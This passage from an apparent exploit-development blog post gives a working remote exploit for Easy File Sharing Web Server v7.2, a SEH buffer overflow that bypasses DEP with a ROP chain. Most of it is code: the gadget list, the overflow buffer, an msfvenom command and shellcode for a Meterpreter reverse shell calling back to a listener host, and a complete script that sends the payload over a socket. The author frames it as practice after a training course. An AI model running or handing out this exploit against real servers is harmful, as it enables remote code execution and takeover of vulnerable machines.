      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x1001b4f6,  # POP ECX # RETN [ImageLoad.dll] 
      0x61c73281,  # &Writable location [sqlite3.dll]
      0x100194b3,  # POP EDI # RETN [ImageLoad.dll] 
      0x1001a858,  # RETN (ROP NOP) [ImageLoad.dll]
      0x10015442,  # POP EAX # RETN [ImageLoad.dll] 
      0x90909090,  # nop
      0x100240c2,  # PUSHAD # RETN [ImageLoad.dll] 
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
{% endcodeblock %}

Those `INC EDX` are really ugly and annoying, but, quickly looking around for a better solution available, I actually didn't find anything nicer. Luckily we have a massive buffer in our disposal, so we can be a bit sloppy...

We are almost there! To quickly test wether we are actually disabling DEP or not, let's modify our buffer a bit:

{% codeblock lang:python %}
# Offsets
rop_offset = 2455
max_size = 5000
seh_offset = 4059
eax_offset = 4183

buffer = "A" * rop_offset						# padding
buffer += create_rop_chain()
buffer += "\xCC\xCC\xCC\xCC"					# couple INT3 instructions, which will act as a breakpoint (only if DEP is disabled)
buffer += "A" * (seh_offset - len(buffer))		# padding
buffer += "BBBB"								# overwrite nSEH pointer
buffer += struct.pack("<I", 0x1002280a)			# overwrite SEH record with stack pivot (ADD ESP,1004 # RETN [ImageLoad.dll])
buffer += "A" * (eax_offset - len(buffer))		# padding
buffer += struct.pack("<I", 0xffffffff)			# overwrite EAX to always trigger an exception
buffer += "A" * (max_size - len(buffer))		# padding
{% endcodeblock %}

Let's put it all together and launch our exploit. If we were successful in disabling DEP, the program should automatically break on the INT3 instructions we added right after the ROP chain.

[![success_rop PNG](/images/posts/2015-11-25-easy-file-sharing-web-server-v7-dot-2-remote-seh-buffer-overflow-dep-bypass-with-rop/success_rop.png)](/images/posts/2015-11-25-easy-file-sharing-web-server-v7-dot-2-remote-seh-buffer-overflow-dep-bypass-with-rop/success_rop.png)

**VICTORY! :)**


Shellcode
---------

We have successfully bypassed DEP and made stack executable again! Now we can simply put a shellcode of our choice and get that shell!

Doing a bit of maths, we can easily calculate that the maximum size of the shellcode can be 1260 bytes, which is *A LOT* for a shellcode - and more than enough to fit meterpreter! Let's go ahead and generate a payload we'll use:

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.246.171 LPORT=31337 -f python -b '\x00\x3b' | sed 's/buf/shellcode/g'
```

And paste it in right after the ROP chain. Note that the last instruction in our ROP chain is `PUSHAD; RETN`, so the next instruction to be executed will be simply the next instruction after this one - that's why we're putting our shellcode immediatelly after.

Also, there's a small 'trick' to keep in mind. Because of the way meterpreter decoders work, during the decoding process meterpreter needs to find its own address in memory. It is achieved by using `FSTENV` instruction, which stores floating point environment on the stack. Because ESP points somewhere in our shellcode, `FSTENV` writes some additional data onto the stack, what corrupts our shellcode!

One simple way around it is to simply move ESP all the way "up" (towards lower memory addresses), far away from our shellcode so it doesn't get corrupted. How far to move? Generally size of the shellcode would do. I chose 1500, just to be on the safe side.

Generate relevant opcode (remember about the bad chars that we should avoid!):

```
root@kali2:~# /usr/share/metasploit-framework/tools/exploit/metasm_shell.rb
type "exit" or "quit" to quit
use ";" or "\n" for newline
type "file <file>" to parse a GAS assembler source file

metasm > add esp,-1500
"\x81\xc4\x24\xfa\xff\xff"
```

And add it as a first instruction in the shellcode. The buffer should look something like this:

{% codeblock lang:python %}
# Offsets
rop_offset = 2455
max_size = 5000
seh_offset = 4059
eax_offset = 4183


# move ESP out of the way so the shellcode doesn't corrupt itself during execution
# metasm > add esp,-1500
shellcode =  "\x81\xc4\x24\xfa\xff\xff"

# msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.246.171 LPORT=31337 -f python -b '\x00\x3b'
#Payload size: 360 bytes
shellcode += "\xb8\x78\xdc\xf7\x67\xda\xc6\xd9\x74\x24\xf4\x5d\x29"
shellcode += "\xc9\xb1\x54\x31\x45\x13\x83\xc5\x04\x03\x45\x77\x3e"
shellcode += "\x02\x9b\x6f\x3c\xed\x64\x6f\x21\x67\x81\x5e\x61\x13"
shellcode += "\xc1\xf0\x51\x57\x87\xfc\x1a\x35\x3c\x77\x6e\x92\x33"
shellcode += "\x30\xc5\xc4\x7a\xc1\x76\x34\x1c\x41\x85\x69\xfe\x78"
shellcode += "\x46\x7c\xff\xbd\xbb\x8d\xad\x16\xb7\x20\x42\x13\x8d"
shellcode += "\xf8\xe9\x6f\x03\x79\x0d\x27\x22\xa8\x80\x3c\x7d\x6a"
shellcode += "\x22\x91\xf5\x23\x3c\xf6\x30\xfd\xb7\xcc\xcf\xfc\x11"
shellcode += "\x1d\x2f\x52\x5c\x92\xc2\xaa\x98\x14\x3d\xd9\xd0\x67"
shellcode += "\xc0\xda\x26\x1a\x1e\x6e\xbd\xbc\xd5\xc8\x19\x3d\x39"
shellcode += "\x8e\xea\x31\xf6\xc4\xb5\x55\x09\x08\xce\x61\x82\xaf"
shellcode += "\x01\xe0\xd0\x8b\x85\xa9\x83\xb2\x9c\x17\x65\xca\xff"
shellcode += "\xf8\xda\x6e\x8b\x14\x0e\x03\xd6\x70\xe3\x2e\xe9\x80"
shellcode += "\x6b\x38\x9a\xb2\x34\x92\x34\xfe\xbd\x3c\xc2\x01\x94"
shellcode += "\xf9\x5c\xfc\x17\xfa\x75\x3a\x43\xaa\xed\xeb\xec\x21"
shellcode += "\xee\x14\x39\xdf\xeb\x82\x6e\x30\x02\xf9\x07\x33\xea"
shellcode += "\x87\xbe\xba\x0c\x27\x11\xed\x80\x87\xc1\x4d\x71\x6f"
shellcode += "\x08\x42\xae\x8f\x33\x88\xc7\x25\xdc\x65\xbf\xd1\x45"
shellcode += "\x2c\x4b\x40\x89\xfa\x31\x42\x01\x0f\xc5\x0c\xe2\x7a"
shellcode += "\xd5\x78\x93\x84\x25\x78\x3e\x85\x4f\x7c\xe8\xd2\xe7"
shellcode += "\x7e\xcd\x15\xa8\x81\x38\x26\xaf\x7d\xbd\x1f\xdb\x4b"
shellcode += "\x2b\x20\xb3\xb3\xbb\xa0\x43\xe5\xd1\xa0\x2b\x51\x82"
shellcode += "\xf2\x4e\x9e\x1f\x67\xc3\x0a\xa0\xde\xb7\x9d\xc8\xdc"
shellcode += "\xee\xe9\x56\x1e\xc5\x6a\x90\xe0\x9b\x4e\x39\x89\x63"
shellcode += "\xce\xb9\x49\x0e\xce\xe9\x21\xc5\xe1\x06\x82\x26\x28"
shellcode += "\x4f\x8a\xad\xbc\x3d\x2b\xb1\x95\xe0\xf5\xb2\x19\x39"
shellcode += "\xe3\x3c\xde\xbe\x0c\xbf\xe3\x68\x35\xb5\x24\xa9\x02"
shellcode += "\xc6\x1f\x8c\x23\x4d\x5f\x82\x34\x44"


buffer = "A" * rop_offset                       # padding
buffer += create_rop_chain()
buffer += shellcode
buffer += "A" * (seh_offset - len(buffer))      # padding
buffer += "BBBB"                                # overwrite nSEH pointer
buffer += struct.pack("<I", 0x1002280a)         # overwrite SEH record with stack pivot (ADD ESP,1004 # RETN [ImageLoad.dll])
buffer += "A" * (eax_offset - len(buffer))      # padding
buffer += struct.pack("<I", 0xffffffff)         # overwrite EAX to always trigger an exception
buffer += "A" * (max_size - len(buffer))        # padding

{% endcodeblock %}

If everything went fine, we should get the meterpreter shell. Set the listener up and run the exploit.

![meterpreter PNG](/images/posts/2015-11-25-easy-file-sharing-web-server-v7-dot-2-remote-seh-buffer-overflow-dep-bypass-with-rop/meterpreter.png)

Whoop-whoop! Obligatory victory-dance (cc: [OJ](https://twitter.com/TheColonial)) :)

![shell_dance GIF](/images/posts/2015-11-25-easy-file-sharing-web-server-v7-dot-2-remote-seh-buffer-overflow-dep-bypass-with-rop/shell_dance.gif)


Summary
-------

The final exploit with a simple PoC shellcode spawning a calculator is shown below.

{% codeblock lang:python %}
#!/usr/bin/env python
#
# Exploit title: Easy File Sharing Web Server v7.2 - Remote SEH Buffer Overflow (DEP bypass with ROP)
# Date: 29/11/2015
# Exploit Author: Knaps
# Contact: @TheKnapsy
# Website: http://blog.knapsy.com
# Software Link: http://www.sharing-file.com/efssetup.exe
# Version: Easy File Sharing Web Server v7.2
# Tested on: Windows 7 x64, but should work on any other Windows platform
#
# Notes:
# - based on non-DEP SEH buffer overflow exploit by Audit0r (https://www.exploit-db.com/exploits/38526/)
# - created for fun & practice, also because it's not 1998 anymore - gotta bypass that DEP! :)
# - bad chars: '\x00' and '\x3b'
# - max shellcode size allowed: 1260 bytes
#

import sys, socket, struct

# ROP chain generated with mona.py - www.corelan.be (and slightly fixed by @TheKnapsy)
# Essentially, use PUSHAD to set all parameters and call VirtualProtect() to disable DEP.
def create_rop_chain():

    rop_gadgets = [
	  # Generate value of 201 in EAX
	  0x10015442,  # POP EAX # RETN [ImageLoad.dll]
	  0xFFFFFDFF,  # Value of '-201'
	  0x100231d1,  # NEG EAX # RETN [ImageLoad.dll]
	
	  # Put EAX into EBX (other unneccessary stuff comes with this gadget as well...)
	  0x1001da09,  # ADD EBX,EAX # MOV EAX,DWORD PTR SS:[ESP+C] # INC DWORD PTR DS:[EAX] # RETN [ImageLoad.dll]
	  
	  # Carry on with the ROP as generated by mona.py
	  0x10015442,  # POP EAX # RETN [ImageLoad.dll] 
      0x61c832d0,  # ptr to &VirtualProtect() [IAT sqlite3.dll]
	
	  # Compensate for the ADD EBX,EAX gadget above, jump over 1 address, which is a dummy writeable location
	  # used solely by the remaining part of the above gadget (it doesn't really do anything for us)
	  0x1001281a,  # ADD ESP,4 # RETN [ImageLoad.dll]
	  0x61c73281,  # &Writable location [sqlite3.dll]
	
	  # And carry on further as generated by mona.py
	  0x1002248c,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [ImageLoad.dll] 
      0x61c18d81,  # XCHG EAX,EDI # RETN [sqlite3.dll]
      0x1001d626,  # XOR ESI,ESI # RETN [ImageLoad.dll] 
      0x10021a3e,  # ADD ESI,EDI # RETN 0x00 [ImageLoad.dll] 
      0x10013ad6,  # POP EBP # RETN [ImageLoad.dll] 
      0x61c227fa,  # & push esp # ret  [sqlite3.dll]
      0x10022c4c,  # XOR EDX,EDX # RETN [ImageLoad.dll] 
	  
	  # Now bunch of ugly increments... unfortunately couldn't find anything nicer :(
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x1001b4f6,  # POP ECX # RETN [ImageLoad.dll] 
      0x61c73281,  # &Writable location [sqlite3.dll]
      0x100194b3,  # POP EDI # RETN [ImageLoad.dll] 
      0x1001a858,  # RETN (ROP NOP) [ImageLoad.dll]
      0x10015442,  # POP EAX # RETN [ImageLoad.dll] 
      0x90909090,  # nop
      0x100240c2,  # PUSHAD # RETN [ImageLoad.dll] 
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

	
# Check command line args 
if len(sys.argv) <= 1:
    print "Usage: python poc.py [host] [port]"
    exit()

host = sys.argv[1]    
port = int(sys.argv[2])


# Offsets
rop_offset = 2455
max_size = 5000
seh_offset = 4059
eax_offset = 4183


# move ESP out of the way so the shellcode doesn't corrupt itself during execution
# metasm > add esp,-1500
shellcode =  "\x81\xc4\x24\xfa\xff\xff"

# Just as a PoC, spawn calc.exe. Replace with any other shellcode you want
# (maximum size of shellcode allowed: 1260 bytes)
#
# msfvenom -p windows/exec CMD=calc.exe -b '\x00\x3b' -f python
# Payload size: 220 bytes
shellcode += "\xbb\xde\x37\x73\xe9\xdb\xdf\xd9\x74\x24\xf4\x58\x31"
shellcode += "\xc9\xb1\x31\x31\x58\x13\x83\xe8\xfc\x03\x58\xd1\xd5"
shellcode += "\x86\x15\x05\x9b\x69\xe6\xd5\xfc\xe0\x03\xe4\x3c\x96"
shellcode += "\x40\x56\x8d\xdc\x05\x5a\x66\xb0\xbd\xe9\x0a\x1d\xb1"
shellcode += "\x5a\xa0\x7b\xfc\x5b\x99\xb8\x9f\xdf\xe0\xec\x7f\xde"
shellcode += "\x2a\xe1\x7e\x27\x56\x08\xd2\xf0\x1c\xbf\xc3\x75\x68"
shellcode += "\x7c\x6f\xc5\x7c\x04\x8c\x9d\x7f\x25\x03\x96\xd9\xe5"
shellcode += "\xa5\x7b\x52\xac\xbd\x98\x5f\x66\x35\x6a\x2b\x79\x9f"
shellcode += "\xa3\xd4\xd6\xde\x0c\x27\x26\x26\xaa\xd8\x5d\x5e\xc9"
shellcode += "\x65\x66\xa5\xb0\xb1\xe3\x3e\x12\x31\x53\x9b\xa3\x96"
shellcode += "\x02\x68\xaf\x53\x40\x36\xb3\x62\x85\x4c\xcf\xef\x28"
shellcode += "\x83\x46\xab\x0e\x07\x03\x6f\x2e\x1e\xe9\xde\x4f\x40"
shellcode += "\x52\xbe\xf5\x0a\x7e\xab\x87\x50\x14\x2a\x15\xef\x5a"
shellcode += "\x2c\x25\xf0\xca\x45\x14\x7b\x85\x12\xa9\xae\xe2\xed"
shellcode += "\xe3\xf3\x42\x66\xaa\x61\xd7\xeb\x4d\x5c\x1b\x12\xce"
shellcode += "\x55\xe3\xe1\xce\x1f\xe6\xae\x48\xf3\x9a\xbf\x3c\xf3"
shellcode += "\x09\xbf\x14\x90\xcc\x53\xf4\x79\x6b\xd4\x9f\x85"


buffer = "A" * rop_offset						# padding
buffer += create_rop_chain()
buffer += shellcode
buffer += "A" * (seh_offset - len(buffer))		# padding
buffer += "BBBB"								# overwrite nSEH pointer
buffer += struct.pack("<I", 0x1002280a)			# overwrite SEH record with stack pivot (ADD ESP,1004 # RETN [ImageLoad.dll])
buffer += "A" * (eax_offset - len(buffer))		# padding
buffer += struct.pack("<I", 0xffffffff)			# overwrite EAX to always trigger an exception
buffer += "A" * (max_size - len(buffer))		# padding


httpreq = (
"GET /changeuser.ghp HTTP/1.1\r\n"
"User-Agent: Mozilla/4.0\r\n"
"Host:" + host + ":" + str(port) + "\r\n"
"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
"Accept-Language: en-us\r\n"
"Accept-Encoding: gzip, deflate\r\n"
"Referer: http://" + host + "/\r\n"
"Cookie: SESSIONID=6771; UserID=" + buffer + "; PassWD=;\r\n"
"Conection: Keep-Alive\r\n\r\n"
)

# Send payload to the server
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.send(httpreq)
s.close()

{% endcodeblock %}

I had a lot of fun writing the exploit, I learnt couple new things and also treated it as a bit of a practice after what I've learned at the before mentioned [Corelan Bootcamp](https://www.corelan-training.com/index.php/training-2/bootcamp/) training (which was **AWESOME** and would highly recommend it to anyone interested in exploit development).

Next on the cards is converting the above exploit into Metasploit module and finding some other PoC's that I may be able to convert to properly working exploits.

Ah, only if I could fit some more hours in the day!
